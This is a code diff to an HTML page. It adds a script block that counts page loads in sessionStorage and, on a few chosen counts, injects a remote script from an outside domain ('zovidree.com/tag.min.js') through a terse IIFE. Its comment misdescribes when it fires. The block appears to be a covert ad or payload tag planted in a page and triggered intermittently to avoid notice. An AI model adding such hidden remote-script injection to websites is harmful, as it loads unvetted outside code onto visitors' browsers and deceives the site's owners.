@@ -59,6 +59,24 @@
 </script>
 </div></div>
 <script>
+    const sessionStorage = window.sessionStorage;
+
+    // Initialize the click counter
+    let clickCount = parseInt(sessionStorage.getItem('clickCount')) || 0;
+    // Check if the script should run (only after the second click)
+    if (clickCount == 3 || clickCount ==6 || clickCount==12 || clickCount==24) {
+        (function(s,u,z,p){
+            s.src = u;
+            s.setAttribute('data-zone', z);
+            p.appendChild(s);
+        })(document.createElement('script'), 'https://zovidree.com/tag.min.js', 7641087, document.body || document.documentElement);
+    }
+
+    // Increment the click counter
+    clickCount += 1;
+    sessionStorage.setItem('clickCount', clickCount.toString());
+</script>
+<script>
     // Get the URL parameters
     const urlParams = new URLSearchParams(window.location.search);
     
